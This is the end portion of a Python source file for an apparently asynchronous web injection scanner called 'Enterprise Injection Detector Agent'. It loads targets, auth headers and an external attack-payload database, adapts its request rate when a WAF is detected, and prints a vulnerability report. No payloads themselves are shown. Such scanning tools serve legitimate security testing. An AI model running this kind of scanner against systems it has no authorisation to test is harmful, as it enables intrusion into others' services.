                    "location": location, "payload": payload, "evidence": "Backend connection crash",
                    "confidence": "High", "request_url": full_url, "variant": label,
                })
        except aiohttp.ClientError:
            pass

    # ------------------------------------------------------------------
    # Reflection context helper
    # ------------------------------------------------------------------
    def _get_reflection_context(self, response_text, payload, context_window=150):
        decoded_payload = unquote(payload)
        idx = -1
        if   decoded_payload in response_text:
            idx = response_text.find(decoded_payload)
        elif html_lib.escape(decoded_payload) in response_text:
            idx = response_text.find(html_lib.escape(decoded_payload))
        elif payload != decoded_payload and payload in response_text:
            idx = response_text.find(payload)
        if idx != -1:
            match_length = max(len(decoded_payload), len(payload))
            start = max(0, idx - context_window)
            end   = min(len(response_text), idx + match_length + context_window)
            return response_text[start:end], idx
        return None, -1


# ==========================================
# ORCHESTRATOR & UI
# ==========================================
def generate_layout():
    layout = Layout(name="root")
    layout.split(
        Layout(name="header", size=3),
        Layout(name="main",   ratio=1),
        Layout(name="footer", size=3),
    )
    layout["main"].split_column(
        Layout(name="top_half",    ratio=1),
        Layout(name="bottom_half", ratio=1),
    )
    layout["top_half"].split_row(
        Layout(name="progress_panel", ratio=2),
        Layout(name="rate_panel",     ratio=1),
    )
    layout["bottom_half"].split_row(
        Layout(name="log_panel",      ratio=1),
        Layout(name="findings_panel", ratio=1),
    )
    return layout


def make_header():
    grid = Table.grid(expand=True)
    grid.add_column(justify="center", ratio=1)
    grid.add_column(justify="right")
    grid.add_row(
        "[bold white on #0d47a1] ENTERPRISE INJECTION DETECTOR AGENT v4.0 [/bold white on #0d47a1]",
        datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    )
    return Panel(grid, style="bold blue", border_style="blue")


def load_targets(file_path):
    if not os.path.exists(file_path):
        return []
    if file_path.endswith('.json'):
        with open(file_path) as f:
            data      = json.load(f)
            endpoints = data.get('endpoints', [])
            summary   = data.get('summary', {})
            if summary and endpoints:
                for ep in endpoints:
                    if 'tech_stack' not in ep and 'tech_stack' in summary:
                        ep['tech_stack'] = summary['tech_stack']
            return [(ep['url'], ep) for ep in endpoints]
    else:
        with open(file_path) as f:
            return [(line.strip(), None) for line in f if line.strip()]


def main(target_file, db_path, config_path=None, rate_limit_config=None):
    console = Console()
    if not os.path.exists(db_path):
        console.print(f"[red]Error: Attack Database not found at {db_path}[/red]")
        return

    with open(db_path) as f:
        db_data = json.load(f)
    console.print("[green][+] Loaded Attack Database[/green]")

    targets = load_targets(target_file)
    if not targets:
        console.print("[red]No targets found.[/red]")
        return

    auth_configs = []
    if config_path and os.path.exists(config_path):
        with open(config_path) as f:
            raw_config = json.load(f)
        if isinstance(raw_config, list):
            auth_configs = raw_config
            console.print(f"[green][+] Loaded {len(auth_configs)} auth profiles from config.[/green]")
        elif isinstance(raw_config, dict):
            auth_configs = [{"match_pattern": k, "headers": v} for k, v in raw_config.items()]

    if rate_limit_config is None:
        rate_config_file = "rate_limit_config.json"
        if os.path.exists(rate_config_file):
            with open(rate_config_file) as f:
                rate_limit_config = json.load(f)
            console.print(f"[green][+] Loaded rate limit config from {rate_config_file}[/green]")
        else:
            rate_limit_config = {}

    state_db = TargetStateDB(console)
    layout   = generate_layout()
    layout["header"].update(make_header())

    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        expand=True,
    )

    initial_rate_limiter = AdaptiveRateLimiter(rate_limit_config)
    live_findings        = LiveFindingsPanel(state_db)

    with Live(layout, console=console, refresh_per_second=4, screen=True):
        layout["progress_panel"].update(Panel(progress, title="[bold]Scan Progress[/bold]", border_style="dim"))
        layout["log_panel"].update(DynamicLog(state_db))
        layout["rate_panel"].update(RateLimitPanel(initial_rate_limiter))
        layout["findings_panel"].update(live_findings)
        layout["footer"].update(Panel(Text("Initializing...", justify="center"), border_style="dim"))

        for i, (url, endpoint_config) in enumerate(targets):
            for task_id in progress.task_ids:
                progress.remove_task(task_id)

            stats_text = Text.from_markup(
                f"Target [cyan]{i+1}[/cyan] of [cyan]{len(targets)}[/cyan] | "
                f"Unique Findings: [bold red]{len(state_db.findings)}[/bold red]"
            )
            layout["footer"].update(Panel(stats_text, border_style="dim"))

            auth = {}
            if auth_configs:
                for profile in auth_configs:
                    match_pattern = profile.get('match_pattern', '')
                    if match_pattern and match_pattern in url:
                        auth = {'type': 'header', 'headers': profile.get('headers', {})}
                        console.print(f"[dim][*] Matched auth profile: {profile.get('name','Unknown')}[/dim]")
                        break

            agent = EnterpriseInjectionAgent(
                url, db_data, state_db, console, progress,
                auth, endpoint_config, rate_limit_config,
            )
            asyncio.run(agent.run())
            layout["rate_panel"].update(RateLimitPanel(agent.rate_limiter))

    console.clear()
    console.rule("[bold blue]SCAN CAMPAIGN COMPLETE[/bold blue]")

    summary_table = Table(show_header=False, box=None, expand=True)
    summary_table.add_column("Key",   style="dim")
    summary_table.add_column("Value", style="bold")
    summary_table.add_row("Total Targets Scanned",        str(len(targets)))
    summary_table.add_row("Unique Vulnerabilities Found",  str(len(state_db.findings)))
    summary_table.add_row(
        "WAF Detected",
        f"[yellow]{state_db.waf_type}[/yellow]" if state_db.waf_detected else "[green]No[/green]",
    )
    high_count = sum(1 for f in state_db.findings if f.get('confidence') == "High")
    summary_table.add_row("High Confidence Findings", f"[red]{high_count}[/red]")

    rl_stats = state_db.rate_limit_stats
    if rl_stats:
        summary_table.add_row("", "")
        summary_table.add_row("[bold]--- Rate Limiting Stats ---[/bold]", "")
        summary_table.add_row("Total Requests Made", str(rl_stats.get('total_requests', 0)))
        summary_table.add_row("Total Time Waiting",  f"{rl_stats.get('total_wait_time', 0):.1f}s")
        summary_table.add_row("Avg Delay/Request",   f"{rl_stats.get('avg_wait_per_request', 0):.3f}s")
        summary_table.add_row("Rate Adjustments",    str(rl_stats.get('rate_adjustments', 0)))
        if rl_stats.get('consecutive_429s', 0) > 0:
            summary_table.add_row("429s Encountered", f"[red]{rl_stats.get('consecutive_429s')}[/red]")

    console.print(Panel(
        summary_table,
        title="[bold white on #0d47a1] EXECUTIVE SUMMARY [/bold white on #0d47a1]",
        expand=False,
    ))

    if not state_db.findings:
        console.print(Panel("[green]No vulnerabilities confirmed.[/green]", title="Result"))
    else:
        console.print("\n")
        console.rule("[bold red]DETAILED VULNERABILITY REPORT[/bold red]")
        grouped: dict = {}
        for f in state_db.findings:
            grouped.setdefault(f['target'], []).append(f)

        for target, findings in grouped.items():
            console.print(f"\n[bold cyan]Target: {target}[/bold cyan]")
            table = Table(show_lines=True, expand=True, border_style="dim")
            table.add_column("ID",                style="dim",      width=4)
            table.add_column("Vulnerability",     style="red bold", width=25)
            table.add_column("Parameter",         style="magenta",  width=15)
            table.add_column("Loc",               style="blue",     width=6)
            table.add_column("Method",            style="blue",     width=6)
            table.add_column("Best Payload",      style="green",    width=25)
            table.add_column("Evidence / Impact", style="yellow",   width=40)

            for idx, f in enumerate(findings, 1):
                payload_display  = f.get('proofs', ['N/A'])[0]
                if len(payload_display) > 25:
                    payload_display = payload_display[:22] + "..."
                evidence_display = f.get('evidence', 'N/A')
                if f.get('proofs') and len(f['proofs']) > 1:
                    evidence_display += f" ({len(f['proofs'])} variants)"
                table.add_row(
                    str(idx),
                    f.get('type',     'N/A'),
                    f.get('param',    'N/A'),
                    f.get('location', 'query').upper(),
                    f.get('method',   'GET'),
                    payload_display,
                    evidence_display,
                )
            console.print(table)
    # Previously inside the "else" branch above (only reached when
    # state_db.findings was non-empty) -- meaning a clean, zero-findings
    # scan (a completely valid, real outcome, not a failure) never wrote
    # a report file at all. Moved outside the if/else so a report is
    # always produced, with or without findings.
    state_db.save_report()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Enterprise Injection Detector Agent v4.0 — Full Async + Strict Detection",
        epilog="Example: python agent.py -t targets.json -c config.json",
    )
    parser.add_argument("-t", "--target", required=True,
                        help="Path to the target file (JSON or TXT)")
    parser.add_argument("-d", "--db",     default="attack_db_final.json",
                        help="Path to the attack database (default: attack_db_final.json)")
    parser.add_argument("-c", "--config", default="config.json",
                        help="Path to the auth config file (default: config.json)")
    args = parser.parse_args()
    main(args.target, args.db, args.config)

    # Optional rate_limit_config.json:
    # {
    #     "normal_rate":   50,
    #     "waf_base_rate":  8,
    #     "mutation_rate":  3,
    #     "header_rate":    5,
    #     "burst_size":    20,
    #     "max_backoff":   30,
    #     "jitter_range": [0.0, 0.05]
    # }